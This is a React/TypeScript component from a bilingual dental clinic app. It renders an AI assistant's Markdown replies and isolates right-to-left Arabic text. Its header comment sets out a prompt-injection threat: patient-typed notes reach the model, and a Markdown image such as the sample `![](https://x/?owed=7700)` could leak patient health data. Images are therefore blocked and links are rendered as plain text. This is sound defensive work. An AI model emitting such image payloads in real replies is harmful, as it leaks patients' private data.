"use client";

import React from "react";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";

/**
 * Renders a model-written reply inside a chat bubble.
 *
 * Two bugs live here, and they are separate:
 *
 * 1. The model writes Markdown. `src/lib/speechText.ts` even says so — "strips the markdown the
 *    model writes for on-screen emphasis" — but only the text-to-speech path ever acted on it, so
 *    on screen, the one place the emphasis was meant for, users read literal `**name**`. Nothing in
 *    the reception persona asks for Markdown or forbids it; it is the model's native habit, so it
 *    cannot be prompted away reliably and has to be handled at render time.
 *
 * 2. This app is bilingual and stores Arabic patient names and treatment names, which the model
 *    inlines into English sentences. An unisolated RTL run inside an LTR paragraph makes the
 *    neutrals around it — brackets, commas, the emphasis markers themselves — reorder under the
 *    Unicode bidi algorithm, which is why "1,950 EGP (*<arabic>*), which" rendered with its
 *    punctuation scattered. See `isolateRtl` below.
 *
 * SECURITY — why this is deliberately more restrictive than HelpMarkdown:
 * HelpMarkdown renders help articles written by us. This renders text from a model whose context is
 * fed patient-typed free text (patientName, notes) that `/api/gemini` itself documents as
 * attacker-influenceable. react-markdown carries no rehype-raw here, so literal HTML in the reply
 * degrades to visible text and cannot execute — but two things still would:
 *
 *   • Images fire an outbound GET with no click at all. `![](https://x/?owed=7700)` in a reply is a
 *     PHI exfiltration channel, and the app ships no CSP to blunt it. Images are disallowed.
 *   • remark-gfm autolinks BARE urls, so a link needs no Markdown authoring: a URL typed into an
 *     appointment note and quoted back by the assistant becomes a live anchor on its own. Links
 *     therefore render as plain text, not anchors. The assistant already has a separate, structured
 *     `navigateTo` channel for taking someone somewhere, so prose links are not a lost feature.
 */

const BLOCKED = ["img", "script", "iframe", "style", "html"];

/** Arabic (+ supplements, presentation forms) and Hebrew. Enough for this app's content. */
const RTL_CHARS = "\\u0590-\\u05FF\\u0600-\\u06FF\\u0750-\\u077F\\u08A0-\\u08FF\\uFB1D-\\uFDFF\\uFE70-\\uFEFF";
/** A run of RTL letters, allowing the spaces and marks that belong inside a phrase. */
const RTL_RUN = new RegExp(`[${RTL_CHARS}][${RTL_CHARS}\\s\\u064B-\\u0652\\u0670]*`, "g");

/**
 * Wraps each right-to-left run in `<bdi>`, which is a true isolate: the run resolves its own
 * direction and the surrounding punctuation keeps the paragraph's.
 *
 * Deliberately NOT `dir="auto"` on the bubble, which is the tempting one-liner. `dir="auto"` picks
 * a direction from the first strong character in the whole element, so an English reply that merely
 * opens with an Arabic patient name would flip the entire paragraph to RTL.
 *
 * Done on the rendered React children rather than by injecting U+2068/U+2069 into the Markdown
 * source, because those characters sit adjacent to `*` delimiters and would put CommonMark's
 * flanking rules in play — fixing the bidi bug by breaking the emphasis parsing.
 */
function isolateRtl(children: React.ReactNode): React.ReactNode {
  return React.Children.map(children, (child) => {
    if (typeof child !== "string") return child;
    if (!new RegExp(`[${RTL_CHARS}]`).test(child)) return child;

    const parts: React.ReactNode[] = [];
    let last = 0;
    let m: RegExpExecArray | null;
    const re = new RegExp(RTL_RUN.source, "g");
    while ((m = re.exec(child)) !== null) {
      // Trailing whitespace belongs to the sentence, not to the isolated run.
      const run = m[0].replace(/\s+$/, "");
      if (!run) continue;
      if (m.index > last) parts.push(child.slice(last, m.index));
      parts.push(<bdi key={`${m.index}-${run.length}`}>{run}</bdi>);
      last = m.index + run.length;
    }
    if (last === 0) return child;
    if (last < child.length) parts.push(child.slice(last));
    return <>{parts}</>;
  });
}

export default function AssistantMarkdown({
  content,
  isRTL,
  className = "",
}: {
  content: string;
  /** The UI language's direction. Pinned explicitly — never inferred from the reply's content. */
  isRTL: boolean;
  className?: string;
}) {
  return (
    <div dir={isRTL ? "rtl" : "ltr"} className={className}>
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        disallowedElements={BLOCKED}
        components={{
          // Blocks carry their own spacing now. The bubble must not keep whitespace-pre-wrap:
          // markdown-to-hast puts a literal newline text node between sibling blocks, which would
          // stack on top of these margins and double every gap.
          p: ({ children }) => <p className="my-2 first:mt-0 last:mb-0">{isolateRtl(children)}</p>,

          // A `#` heading inside a 450px bubble is absurd. Every level lands as emphatic text.
          h1: ({ children }) => <p className="my-2 font-black first:mt-0">{isolateRtl(children)}</p>,
          h2: ({ children }) => <p className="my-2 font-black first:mt-0">{isolateRtl(children)}</p>,
          h3: ({ children }) => <p className="my-2 font-black first:mt-0">{isolateRtl(children)}</p>,
          h4: ({ children }) => <p className="my-2 font-black first:mt-0">{isolateRtl(children)}</p>,
          h5: ({ children }) => <p className="my-2 font-black first:mt-0">{isolateRtl(children)}</p>,
          h6: ({ children }) => <p className="my-2 font-black first:mt-0">{isolateRtl(children)}</p>,

          strong: ({ children }) => <strong className="font-bold">{isolateRtl(children)}</strong>,
          em: ({ children }) => <em className="italic">{isolateRtl(children)}</em>,
          del: ({ children }) => <del className="opacity-60">{isolateRtl(children)}</del>,

          ul: ({ children }) => (
            <ul className={`my-2 space-y-1 list-disc ${isRTL ? "mr-4" : "ml-4"} marker:opacity-40`}>
              {children}
            </ul>
          ),
          // `start` is forwarded deliberately: overriding <ol> without it silently renumbers a list
          // that began anywhere but 1, which in a dental context quietly rewrites tooth numbers.
          ol: ({ children, start }) => (
            <ol start={start} className={`my-2 space-y-1 list-decimal ${isRTL ? "mr-4" : "ml-4"} marker:font-bold marker:opacity-60`}>
              {children}
            </ol>
          ),
          li: ({ children }) => <li className="[&>p]:my-0">{isolateRtl(children)}</li>,

          // Not an anchor — see the security note above.
          a: ({ children }) => <span className="underline decoration-dotted underline-offset-2">{isolateRtl(children)}</span>,

          code: ({ children }) => (
            <code className="rounded bg-black/5 px-1 py-0.5 font-mono text-[0.9em] break-all">{children}</code>
          ),
          pre: ({ children }) => (
            <pre className="my-2 overflow-x-auto rounded-lg bg-black/5 p-2 text-[0.85em] leading-snug">{children}</pre>
          ),

          blockquote: ({ children }) => (
            <blockquote className={`my-2 ${isRTL ? "border-r-2 pr-3" : "border-l-2 pl-3"} border-current/20 opacity-80`}>
              {children}
            </blockquote>
          ),

          // Wide content must scroll inside itself; the bubble may not grow sideways.
          table: ({ children }) => (
            <div className="my-2 overflow-x-auto">
              <table className="w-full border-collapse text-[0.9em]">{children}</table>
            </div>
          ),
          th: ({ children }) => (
            <th className={`border-b border-current/15 px-2 py-1 font-bold ${isRTL ? "text-right" : "text-left"}`}>
              {isolateRtl(children)}
            </th>
          ),
          td: ({ children }) => (
            <td className="border-b border-current/10 px-2 py-1 align-top">{isolateRtl(children)}</td>
          ),

          hr: () => <hr className="my-3 border-current/15" />,
        }}
      >
        {content}
      </ReactMarkdown>
    </div>
  );
}
